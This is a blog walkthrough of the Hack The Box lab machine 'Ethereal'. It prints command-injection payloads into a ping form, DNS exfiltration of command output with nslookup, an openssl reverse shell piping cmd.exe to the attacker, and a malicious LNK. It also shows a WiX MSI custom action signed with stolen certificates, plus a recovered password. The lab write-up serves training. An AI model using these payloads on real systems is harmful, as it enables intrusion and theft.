<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Hack The Box - Ethereal - 0xRick’s Blog</title>
<meta name="description" content="My write-up / walkthrough for Ethereal from Hack The Box.">


  <meta name="author" content="0xRick">
  
  <meta property="article:author" content="0xRick">
  


<meta property="og:type" content="article">
<meta property="og:locale" content="en">
<meta property="og:site_name" content="0xRick's Blog">
<meta property="og:title" content="Hack The Box - Ethereal">
<meta property="og:url" content="https://0xrick.github.io/hack-the-box/ethereal/">


  <meta property="og:description" content="My write-up / walkthrough for Ethereal from Hack The Box.">





  <meta name="twitter:site" content="@ahm3d_h3sham">
  <meta name="twitter:title" content="Hack The Box - Ethereal">
  <meta name="twitter:description" content="My write-up / walkthrough for Ethereal from Hack The Box.">
  <meta name="twitter:url" content="https://0xrick.github.io/hack-the-box/ethereal/">

  
    <meta name="twitter:card" content="summary">
    
  

  



  <meta property="article:published_time" content="2019-03-09T07:00:00+02:00">






<link rel="canonical" href="https://0xrick.github.io/hack-the-box/ethereal/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "0xRick",
      "url": "https://0xrick.github.io/"
    
  }
</script>







<!-- end _includes/seo.html -->




<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
        <a class="site-title" href="/">
          0xRick's Blog
          
        </a>
        <ul class="visible-links">
<li class="masthead__menu-item">
              <a href="/about">About</a>
            </li>
<li class="masthead__menu-item">
              <a href="/categories">Categories</a>
            </li>
<li class="masthead__menu-item">
              <a href="/tags">Tags</a>
            </li>
</ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/images/avatar.jpg" alt="0xRick" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">0xRick</h3>
    
    
      <div class="author__bio" itemprop="description">
        

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Somewhere between 1's and 0's</span>
        </li>
      

      
        
          
            <li><a href="/" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-home" aria-hidden="true"></i><span class="label">Home Page</span></a></li>
          
        
          
            <li><a href="https://twitter.com/ahm3d_h3sham" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
            <li><a href="https://github.com/0xRick" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">Github</span></a></li>
          
        
          
            <li><a href="https://www.buymeacoffee.com/VGEfcAqvn" rel="noopener noreferrer" target="_blank"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">buymeacoffee</span></a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>
 
  
  </div>


  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Hack The Box - Ethereal">
    <meta itemprop="description" content="Hack The Box - EtherealQuick SummaryHey guys today Ethereal retired and here is my write-up about it. And as the difficulty says , It’s insane ! The most annoying part about this box is that it was very hard to enumerate because we only get a blind RCE and the firewall rules made it even harder because it only allowed TCP connection for 2 ports. It was fun and annoying at the same time but I liked it. It’s a Windows box and its ip is 10.10.10.106 I added it to /etc/hosts as ethereal.htb , Let’s jump right in !NmapAs always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC ethereal.htbAnd we get FTP on port 21 , HTTP on port 80 and 8080. It also tells us that FTP anonymous authentication is allowed. As always we will enumerate HTTP first.HTTP Initial EnumerationOn port 80 we see this website :The only interseting thing is in the menu we see an Admin-area :Clicking on that we get redirected to this page which has some other options like Notes , Messages , Desktop and Ping :By going to notes we only get this :So now we know that there’s a “test connection” page somewhere , we also get a potential username alan. By clicking on messages we get nothing , but desktop :And it’s very clear that this is fake , also the user.txt is a troll :By clicking on ping we get redirected to port 8080 which asks us for authentication and it uses http basic auth :So now we know what’s on port 8080 , the “Test Connection” page. But we need credentials to access it.One more thing to check is sub directory enumeration with gobsuter or any alternative :gobuster -u http://ethereal.htb -w /usr/share/wordlists/dirb/common.txt -t 100 -to 250s =====================================================Gobuster v2.0.0              OJ Reeves (@TheColonial)=====================================================[+] Mode         : dir[+] Url/Domain   : http://ethereal.htb/[+] Threads      : 100[+] Wordlist     : /usr/share/wordlists/dirb/common.txt[+] Status codes : 200,204,301,302,307,403[+] Timeout      : 4m10s=====================================================2019/03/06 21:51:24 Starting gobuster=====================================================/corp (Status: 301)gobuster only found /corp with the wordlist /usr/share/wordlists/dirb/common.txt and that’s the subdirectory that had the admin stuff. We can’t get any more info and there’s nothing to exploit so next thing to look at is FTPFTP EnumerationOn FTP there are some files but the most interesting ones are FDISK.zip and DISK.zip so we will check them first :We will unzip them :Then we will check what kind of files do we have with file :Most likely they are mountable disks so we will create a directory to mount them and call it mnt then we will make a directory for disk1 , disk2 and fdisk and finally we will mount them mount -o loop [Disk] [Directory] : In disk1 and disk2 there are some files that are not very interesting :But on fdisk there’s a directory called pbox :It contains an executable called pbox.exe and a dat file called pbox.dat :Getting CredentialsWe will switch to a windows box to run that executable , you can alternatively use wine or a program called dosbox. wine didn’t work for me and dosbox kept crashing every 15 seconds.When we try to open it it asks for a password : At this point the only option I had was to guess the password because I didn’t know how to bruteforce the password in this case , however the password was “password” :D , so no bruteforce is needed it’s only a quick guess , after we get in , we see this password database :databases :msdn :learning :ftp drop :backup :website uploads :truecrypt :management server :svn : Back to our kali , now we can create a list with all the information we got :I put the passwords in a separate list to bruteforce the http auth with it :We will use wfuzz and we will try the username alan first :wfuzz -u http://ethereal.htb:8080 --basic alan:FUZZ -w passwords.txtPassword : !C414m17y57r1k3s4g41n!Blind RCENow after we login we get the “Test Connection” page and we have an input for the ip address to ping.Now we can try to bypass that and inject system commands using &amp; or | , but we don’t get any output. I also tried to host nc.exe on a python http server and used certutil to download it but the python server didn’t get any requests. Finally when I ran responder :responder -I tun0` then did this `10.10.xx.xx &amp; nslookup test 10.10.xx.xxI finally got something :We can try to execute a system command and get the output by doing this :10.10.xx.xx &amp; for /f %i in ('whoami') do nslookup %i 10.10.xx.xxThis is executing whoami then taking the output and doing nslookup with the output to our ip :We get etherealalan and that’s unusual as we expected ethereal\alan.We will start enumerating the filesystem this way , read this if you don’t understand some of the for commands that we will use.10.10.xx.xx &amp; for /f %i in ('cd') do nslookup %i 10.10.xx.xxSo the current directory is c:\windows\system32\inetsrvWe also need to know the users on the box :10.10.xx.xx &amp; for /f &quot;tokens=1,2,3&quot; %a in ('dir /B &quot;C:\Users&quot;') do nslookup %a.%b.%c 10.10.xx.xxWe have 5 users on the box alan , jorge , Public , rupal and Administrator. We are executing commands as alanNext thing to look at is the installed programs :10.10.xx.xx &amp; for /f &quot;tokens=1,2,3&quot; %a in ('dir /B &quot;C:\Program Files (x86)&quot;') do nslookup %a.%b.%c 10.10.xx.xxWe notice that OpenSSL is installed which is unusual , we also need to know why can’t we make the box connect back to us so we will check the firewall rules. In our case the easiest way to do this is to execute the command and only look for the string Rule Name: then redirect that output to a file , and read that file like we  are doing. But first we need to find a place that we can write to. After some attempts I could write to c:\users\public\desktop\shortcuts , so we will do this :10.10.xx.xx &amp; netsh advfirewall firewall show rule name=all | findstr &quot;Rule Name:&quot; &gt; C:\Users\Public\Desktop\Shortcuts\firewall.txtThen we will list the contents of c:\users\public\desktop\shortcuts :10.10.xx.xx &amp; for /f &quot;tokens=1,2,3&quot; %a in ('dir /B &quot;C:\Users\Public\Desktop\Shortcuts&quot;') do nslookup %a.%b.%c 10.10.xx.xxAnd we see that we have successfully written into that directory , next step is to read the file :10.10.xx.xx &amp; for /f &quot;tokens=1,2,3,4,5,6,7&quot; %a in ('type C:\Users\Public\Desktop\Shortcuts\firewall.txt') do nslookup %a.%b.%c.%d.%e.%f.%g 10.10.xx.xxIt’s only allowing TCP conections to port 73 and 136 , we saw earlier that openssl was installed on the box , we can create a SSL/TLS server on these ports and use openssl to make the box connect back to us.Generating certs and setting up the serverFirst step is to generate certificates because we need them to set up the server :openssl req -x509 -newkey rsa:4096 -keyout key.pem -out certificate.pem -days 365 -nodesThen we will split our terminal and run 2 servers , one on port 73 and the other on port 136 :openssl s_server -key key.pen -cert certificate.pem -quiet -port [port]Read more about s_serverWe are setting up 2 servers because we are going to use openssl on the box to connect on port 73 and take our input , then we will pipe that input to cmd.exe then we will pipe the output to our server on port 136.Now we need to locate openssl.exe , if we listed the contents of OpenSSL-v1.1.0 in Program Files (x86) (can also be written Progra~2. check this) we will get this output :10.10.xx.xx &amp; for /f &quot;tokens=1,2,3&quot; %a in ('dir /B &quot;C:\Program Files (x86)\OpenSSL-v1.1.0&quot;') do nslookup %a.%b.%c 10.10.xx.xxWe see a directory called bin that’s where openssl.exe is located so the path is c:\progra~2\OpenSSL-v1.1.0\bin\openssl.exeNow everything is ready , in the ping page we will write this :10.10.xx.xx | &quot;C:\Program Files (x86)\OpenSSL-v1.1.0\bin\openssl.exe&quot; s_client -quiet -connect 10.10.xx.xx:73 | cmd.exe | &quot;C:\Program Files (x86)\OpenSSL-v1.1.0\bin\openssl.exe&quot; s_client -quiet -connect 10.10.xx.xx:136Then we will check our server :Now we will write the commands on the first server (port 73) , then we will refresh the ping page , to send the post request again (this will pipe our input from port 73 to cmd.exe then to the server on port 136) then we will get our output on the second server.alan’s desktop doesn’t have the flag so we need to escalate to another user , there’s a note on alan’s desktop in a file called note-draft.txt:Creating a malicious lnk and getting UserFrom the note we knew that there’s a lnk on Public’s desktop and other users on the box are using it.So if we replaced it with a payload we can get a shell as another user. There’s a tool on github called LNKup I used it to create the payload :To uplaod it we will close any one of the servers and run it again but this time we will redirect the lnk file to it :Then on the ping page we will type this :10.10.xx.xx | &quot;C:\Program Files (x86)\OpenSSL-v1.1.0\bin\openssl.exe&quot; s_client -quiet -connect 10.10.xx.xx:136 &gt; &quot;C:\Users\Public\Desktop\Shortcuts\rick.lnk&quot;We will close the server , run the 2 servers and get our shell as alan like we did before , then we will delete the original lnk and copy ours with the name of the old lnk :del &quot;c:\users\public\desktop\shortcuts\Visual Studio 2017.lnk&quot; &amp; copy &quot;c:\users\public\desktop\shortcuts\rick.lnk&quot; &quot;c:\users\public\desktop\shortcuts\Visual Studio 2017.lnk&quot; &amp; dir c:\users\public\desktop\shortcutsThen we will close the 2 servers , run them again and wait for someone to execute the lnk file , after a minute we will get a shell as jorge :With this we don’t need to refresh any pages because the connection is not handled by the ping page anymore so the command will be piped immediately from the first server to the second server.Finally we owned user !More Filesystem EnumerationIf we checked the other drives : fsutil fsinfo drivesWe will find that C is not the only drive and there’s also D.Unfortunately if someone started to enumerate without doing this important step in windows enumeration , they won’t get anything.Contents of D:In DEV there’s a directory called MSIs and it has a note :So we have to create a malicious msi and place it there to get a shell as rupal. We also need to get the certs to sign the msi , the certs are found in D:\Certs , MyCA.cer and MyCA.pvk , to transfer them to our box we will use openssl to base64 encode the certs then we can copy and decode on our box.C:\progra~2\OpenSSL-v1.1.0\bin\openssl.exe base64 -in MyCA.cerC:\progra~2\OpenSSL-v1.1.0\bin\openssl.exe base64 -in MyCA.pvkNow we will go to a windows box again to create the msiCreating Malicious msi and getting rootIn order to create the msi we will use wixtools , you can use other msi builders but they didn’t work for me.Check this page for some wix msi usage examples.We will create an msi that executes our lnk file :&lt;?xml version=&quot;1.0&quot;?&gt;&lt;Wix xmlns=&quot;http://schemas.microsoft.com/wix/2006/wi&quot;&gt;&lt;Product Id=&quot;*&quot; UpgradeCode=&quot;12345678-1234-1234-1234-111111111111&quot; Name=&quot;Example Product Name&quot;Version=&quot;0.0.1&quot; Manufacturer=&quot;@_xpn_&quot; Language=&quot;1033&quot;&gt;&lt;Package InstallerVersion=&quot;200&quot; Compressed=&quot;yes&quot; Comments=&quot;Windows Installer Package&quot;/&gt;&lt;Media Id=&quot;1&quot; Cabinet=&quot;product.cab&quot; EmbedCab=&quot;yes&quot;/&gt;&lt;Directory Id=&quot;TARGETDIR&quot; Name=&quot;SourceDir&quot;&gt;&lt;Directory Id=&quot;ProgramFilesFolder&quot;&gt;&lt;Directory Id=&quot;INSTALLLOCATION&quot; Name=&quot;Example&quot;&gt;&lt;Component Id=&quot;ApplicationFiles&quot; Guid=&quot;12345678-1234-1234-1234-222222222222&quot;&gt;&lt;/Component&gt;&lt;/Directory&gt;&lt;/Directory&gt;&lt;/Directory&gt;&lt;Feature Id=&quot;DefaultFeature&quot; Level=&quot;1&quot;&gt;&lt;ComponentRef Id=&quot;ApplicationFiles&quot;/&gt;&lt;/Feature&gt;&lt;Property Id=&quot;cmdline&quot;&gt;cmd.exe /C &quot;c:\users\public\desktop\shortcuts\rick.lnk&quot;&lt;/Property&gt;&lt;CustomAction Id=&quot;Stage1&quot; Execute=&quot;deferred&quot; Directory=&quot;TARGETDIR&quot; ExeCommand='[cmdline]' Return=&quot;ignore&quot;Impersonate=&quot;yes&quot;/&gt;&lt;CustomAction Id=&quot;Stage2&quot; Execute=&quot;deferred&quot; Script=&quot;vbscript&quot; Return=&quot;check&quot;&gt;fail_here&lt;/CustomAction&gt;&lt;InstallExecuteSequence&gt;&lt;Custom Action=&quot;Stage1&quot; After=&quot;InstallInitialize&quot;&gt;&lt;/Custom&gt;&lt;Custom Action=&quot;Stage2&quot; Before=&quot;InstallFiles&quot;&gt;&lt;/Custom&gt;&lt;/InstallExecuteSequence&gt;&lt;/Product&gt;&lt;/Wix&gt; We will use candle.exe from wixtools to create a wixobject from msi.xmlThen we will use light.exe to create the msi file from the wixobject After that we need tools from microsoft sdk to sign our msi , first we will use makecert.exe to create new certs from the original certs we got from the boxmakecert.exe -n &quot;CN=Ethereal&quot; -pe -cy end -ic c:\tmp\MyCA.cer -iv c:\tmp\MyCA.pvk -sky signature -sv c:\tmp\rick.pvk c:\tmp\rick.cerIt will ask for a password we will leave it blank for no password protection :Then we will use pvk2pfx.exe to create a pfx for both the cer and the pvk files :pvk2pfx.exe -pvk c:\tmp\rick.pvk -spc c:\tmp\rick.cer -pfx c:\tmp\rick.pfxAnd finally we will use signtool.exe to sign the msi with the pfx :signtool.exe sign /f c:\tmp\rick.pfx c:\tmp\ethereal\rick.msiNow back to our kali we will upload the msi the same way we uploaded the lnk file before , and we also need to make sure that the lnk file is in c:\users\public\desktop\shortcuts\ because the msi is just executing that lnk. We will put the msi into D:\DEV\MSIsThen we will close the servers , run them again and wait for around 3-5 minutes until rupal opens the msiAnd we got root !That’s it , Feedback is appreciated !Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter @Ahm3d_H3shamThanks for reading.Previous Hack The Box write-up : Hack The Box - AccessNext Hack The Box write-up : Hack The Box - Carrier">
    <meta itemprop="datePublished" content="2019-03-09T07:00:00+02:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title p-name" itemprop="headline">
            <a href="https://0xrick.github.io/hack-the-box/ethereal/" class="u-url" itemprop="url">Hack The Box - Ethereal
</a>
          </h1>
          

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2019-03-09T07:00:00+02:00">March 9, 2019</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          11 minute read
        
      </span>
    
  </p>


        </header>
      

      <section class="page__content e-content" itemprop="text">
        <div>
          <style>
              #carbonads {
                border: 1px solid black;
                border-radius: 7px;
                border-spacing: 7px;
                display: block;
                overflow: hidden;
                padding: 1em;
                line-height: 1.5;
              }
              #carbonads span {
                position: relative;
                display: block;
                overflow: hidden;
              }
              .carbon-img img {
                display: block;
                float: left;
              }
              .carbon-text {
                display: block;
                font-size: .9em;
                text-align: end;
              }
              .carbon-poweredby {
                display: block;
                font-size: .8em;
                float: right;
                line-height: 1;
                letter-spacing: 1px;
                }
                </style>
                <br>   
          <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&amp;placement=0xrickgithubio" id="_carbonads_js"></script> 
                <br>
        </div>
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title">
<i class="fas fa-file-alt"></i> Contents</h4></header>
              <ul class="toc__menu"><li>
<a href="#hack-the-box---ethereal">Hack The Box - Ethereal</a><ul>
<li><a href="#quick-summary">Quick Summary</a></li>
<li><a href="#nmap">Nmap</a></li>
<li><a href="#http-initial-enumeration">HTTP Initial Enumeration</a></li>
<li><a href="#ftp-enumeration">FTP Enumeration</a></li>
<li><a href="#getting-credentials">Getting Credentials</a></li>
<li><a href="#blind-rce">Blind RCE</a></li>
<li><a href="#generating-certs-and-setting-up-the-server">Generating certs and setting up the server</a></li>
<li><a href="#creating-a-malicious-lnk-and-getting-user">Creating a malicious lnk and getting User</a></li>
<li><a href="#more-filesystem-enumeration">More Filesystem Enumeration</a></li>
<li><a href="#creating-malicious-msi-and-getting-root">Creating Malicious msi and getting root</a></li>
</ul>
</li></ul>

            </nav>
          </aside>
        
        <h1 id="hack-the-box---ethereal">Hack The Box - Ethereal</h1>

<h2 id="quick-summary">Quick Summary</h2>
<p>Hey guys today Ethereal retired and here is my write-up about it. And as the difficulty says , It’s insane ! The most annoying part about this box is that it was very hard to enumerate because we only get a blind RCE and the firewall rules made it even harder because it only allowed TCP connection for 2 ports. It was fun and annoying at the same time but I liked it. It’s a Windows box and its ip is 10.10.10.106 I added it to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> as <code class="language-plaintext highlighter-rouge">ethereal.htb</code> , Let’s jump right in !
<br><img src="/images/hackthebox/ethereal/0.png" alt="" class="align-center"><br><br></p>

<h2 id="nmap">Nmap</h2>
<p>As always we will start with nmap to scan for open ports and services : 
<code class="language-plaintext highlighter-rouge">nmap -sV -sT -sC ethereal.htb</code>
<br><img src="/images/hackthebox/ethereal/1.png" alt="" class="align-center"><br><br>
And we get FTP on port 21 , HTTP on port 80 and 8080. It also tells us that FTP anonymous authentication is allowed. As always we will enumerate HTTP first.<br></p>

<h2 id="http-initial-enumeration">HTTP Initial Enumeration</h2>
<p>On port 80 we see this website :
<br><img src="/images/hackthebox/ethereal/2.png" alt="" class="align-center"><br><br>
The only interseting thing is in the menu we see an Admin-area :
<br><img src="/images/hackthebox/ethereal/3.png" alt="" class="align-center"><br><br>
Clicking on that we get redirected to this page which has some other options like Notes , Messages , Desktop and Ping :
<br><img src="/images/hackthebox/ethereal/4.png" alt="" class="align-center"><br><br>
By going to <code class="language-plaintext highlighter-rouge">notes</code> we only get this :
<br><img src="/images/hackthebox/ethereal/5.png" alt="" class="align-center"><br><br>
So now we know that there’s a “test connection” page somewhere , we also get a potential username <code class="language-plaintext highlighter-rouge">alan</code>. By clicking on <code class="language-plaintext highlighter-rouge">messages</code> we get nothing , but <code class="language-plaintext highlighter-rouge">desktop</code> :
<br><img src="/images/hackthebox/ethereal/6.png" alt="" class="align-center"><br><br>
And it’s very clear that this is fake , also the user.txt is a troll :
<br><img src="/images/hackthebox/ethereal/7.png" alt="" class="align-center"><br><br>
By clicking on <code class="language-plaintext highlighter-rouge">ping</code> we get redirected to port 8080 which asks us for authentication and it uses http basic auth :
<br><img src="/images/hackthebox/ethereal/8.png" alt="" class="align-center"><br><br>
So now we know what’s on port 8080 , the “Test Connection” page. But we need credentials to access it.<br>
One more thing to check is sub directory enumeration with gobsuter or any alternative :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster -u http://ethereal.htb -w /usr/share/wordlists/dirb/common.txt -t 100 -to 250s 
=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://ethereal.htb/
[+] Threads      : 100
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 4m10s
=====================================================
2019/03/06 21:51:24 Starting gobuster
=====================================================
/corp (Status: 301)
</code></pre></div></div>
<p>gobuster only found <code class="language-plaintext highlighter-rouge">/corp</code> with the wordlist <code class="language-plaintext highlighter-rouge">/usr/share/wordlists/dirb/common.txt</code> and that’s the subdirectory that had the admin stuff. We can’t get any more info and there’s nothing to exploit so next thing to look at is FTP</p>

<h2 id="ftp-enumeration">FTP Enumeration</h2>
<p>On FTP there are some files but the most interesting ones are <code class="language-plaintext highlighter-rouge">FDISK.zip</code> and <code class="language-plaintext highlighter-rouge">DISK.zip</code> so we will check them first :
<br><img src="/images/hackthebox/ethereal/9.png" alt="" class="align-center"><br><br>
We will <code class="language-plaintext highlighter-rouge">unzip</code> them :
<br><img src="/images/hackthebox/ethereal/10.png" alt="" class="align-center"><br><br>
Then we will check what kind of files do we have with <code class="language-plaintext highlighter-rouge">file</code> :
<br><img src="/images/hackthebox/ethereal/11.png" alt="" class="align-center"><br><br>
Most likely they are mountable disks so we will create a directory to mount them and call it <code class="language-plaintext highlighter-rouge">mnt</code> then we will make a directory for <code class="language-plaintext highlighter-rouge">disk1</code> , <code class="language-plaintext highlighter-rouge">disk2</code> and <code class="language-plaintext highlighter-rouge">fdisk</code> and finally we will mount them <code class="language-plaintext highlighter-rouge">mount -o loop [Disk] [Directory]</code> : 
<br><img src="/images/hackthebox/ethereal/12.png" alt="" class="align-center"><br><br>
In <code class="language-plaintext highlighter-rouge">disk1</code> and <code class="language-plaintext highlighter-rouge">disk2</code> there are some files that are not very interesting :
<br><img src="/images/hackthebox/ethereal/13.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/ethereal/14.png" alt="" class="align-center"><br><br>
But on fdisk there’s a directory called <code class="language-plaintext highlighter-rouge">pbox</code> :
<br><img src="/images/hackthebox/ethereal/15.png" alt="" class="align-center"><br><br>
It contains an executable called <code class="language-plaintext highlighter-rouge">pbox.exe</code> and a dat file called <code class="language-plaintext highlighter-rouge">pbox.dat</code> :
<br><img src="/images/hackthebox/ethereal/16.png" alt="" class="align-center"><br><br></p>

<h2 id="getting-credentials">Getting Credentials</h2>
<p>We will switch to a windows box to run that executable , you can alternatively use <code class="language-plaintext highlighter-rouge">wine</code> or a program called <code class="language-plaintext highlighter-rouge">dosbox</code>. <code class="language-plaintext highlighter-rouge">wine</code> didn’t work for me and <code class="language-plaintext highlighter-rouge">dosbox</code> kept crashing every 15 seconds.<br>
<br><img src="/images/hackthebox/ethereal/17.png" alt="" class="align-center"><br><br>
When we try to open it it asks for a password : 
<br><img src="/images/hackthebox/ethereal/18.png" alt="" class="align-center"><br><br>
At this point the only option I had was to guess the password because I didn’t know how to bruteforce the password in this case , however the password was “password” :D , so no bruteforce is needed it’s only a quick guess , after we get in , we see this password database :
<br><img src="/images/hackthebox/ethereal/19.png" alt="" class="align-center"><br><br>
databases :
<br><img src="/images/hackthebox/ethereal/20.png" alt="" class="align-center"><br><br>
msdn :
<br><img src="/images/hackthebox/ethereal/21.png" alt="" class="align-center"><br><br>
learning :
<br><img src="/images/hackthebox/ethereal/22.png" alt="" class="align-center"><br><br>
ftp drop :
<br><img src="/images/hackthebox/ethereal/23.png" alt="" class="align-center"><br><br>
backup :
<br><img src="/images/hackthebox/ethereal/24.png" alt="" class="align-center"><br><br>
website uploads :
<br><img src="/images/hackthebox/ethereal/25.png" alt="" class="align-center"><br><br>
truecrypt :
<br><img src="/images/hackthebox/ethereal/26.png" alt="" class="align-center"><br><br>
management server :
<br><img src="/images/hackthebox/ethereal/27.png" alt="" class="align-center"><br><br>
svn : 
<br><img src="/images/hackthebox/ethereal/28.png" alt="" class="align-center"><br><br>
Back to our kali , now we can create a list with all the information we got :
<br><img src="/images/hackthebox/ethereal/29.png" alt="" class="align-center"><br><br>
I put the passwords in a separate list to bruteforce the http auth with it :
<br><img src="/images/hackthebox/ethereal/30.png" alt="" class="align-center"><br><br>
We will use <code class="language-plaintext highlighter-rouge">wfuzz</code> and we will try the username <code class="language-plaintext highlighter-rouge">alan</code> first :
<code class="language-plaintext highlighter-rouge">wfuzz -u http://ethereal.htb:8080 --basic alan:FUZZ -w passwords.txt</code>
<br><img src="/images/hackthebox/ethereal/31.png" alt="" class="align-center"><br><br>
Password : <code class="language-plaintext highlighter-rouge">!C414m17y57r1k3s4g41n!</code></p>

<h2 id="blind-rce">Blind RCE</h2>
<p>Now after we login we get the “Test Connection” page and we have an input for the ip address to ping.<br>
<br><img src="/images/hackthebox/ethereal/32.png" alt="" class="align-center"><br><br>
Now we can try to bypass that and inject system commands using <code class="language-plaintext highlighter-rouge">&amp;</code> or <code class="language-plaintext highlighter-rouge">|</code> , but we don’t get any output. I also tried to host <code class="language-plaintext highlighter-rouge">nc.exe</code> on a python http server and used <code class="language-plaintext highlighter-rouge">certutil</code> to download it but the python server didn’t get any requests. Finally when I ran responder :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>responder -I tun0` then did this `10.10.xx.xx &amp; nslookup test 10.10.xx.xx
</code></pre></div></div>
<p><br><img src="/images/hackthebox/ethereal/33.png" alt="" class="align-center"><br><br>
I finally got something :
<br><img src="/images/hackthebox/ethereal/34.png" alt="" class="align-center"><br><br>
We can try to execute a system command and get the output by doing this :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.xx.xx &amp; for /f %i in ('whoami') do nslookup %i 10.10.xx.xx
</code></pre></div></div>
<p><br><img src="/images/hackthebox/ethereal/35.png" alt="" class="align-center"><br><br>
This is executing <code class="language-plaintext highlighter-rouge">whoami</code> then taking the output and doing nslookup with the output to our ip :
<br><img src="/images/hackthebox/ethereal/36.png" alt="" class="align-center"><br><br>
We get <code class="language-plaintext highlighter-rouge">etherealalan</code> and that’s unusual as we expected <code class="language-plaintext highlighter-rouge">ethereal\alan</code>.<br>
We will start enumerating the filesystem this way , <a href="https://ss64.com/nt/for_f.html" target="_blank" rel="noopener noreferrer">read this</a> if you don’t understand some of the <code class="language-plaintext highlighter-rouge">for</code> commands that we will use.<br></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.xx.xx &amp; for /f %i in ('cd') do nslookup %i 10.10.xx.xx
</code></pre></div></div>
<p><br><img src="/images/hackthebox/ethereal/37.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/ethereal/38.png" alt="" class="align-center"><br><br>
So the current directory is <code class="language-plaintext highlighter-rouge">c:\windows\system32\inetsrv</code>
We also need to know the users on the box :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.xx.xx &amp; for /f "tokens=1,2,3" %a in ('dir /B "C:\Users"') do nslookup %a.%b.%c 10.10.xx.xx
</code></pre></div></div>
<p><br><img src="/images/hackthebox/ethereal/39.png" alt="" class="align-center"><br><br>
We have 5 users on the box <code class="language-plaintext highlighter-rouge">alan</code> , <code class="language-plaintext highlighter-rouge">jorge</code> , <code class="language-plaintext highlighter-rouge">Public</code> , <code class="language-plaintext highlighter-rouge">rupal</code> and <code class="language-plaintext highlighter-rouge">Administrator</code>. We are executing commands as <code class="language-plaintext highlighter-rouge">alan</code>
Next thing to look at is the installed programs :</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.xx.xx &amp; for /f "tokens=1,2,3" %a in ('dir /B "C:\Program Files (x86)"') do nslookup %a.%b.%c 10.10.xx.xx
</code></pre></div></div>

<p><br><img src="/images/hackthebox/ethereal/40.png" alt="" class="align-center"><br><br>
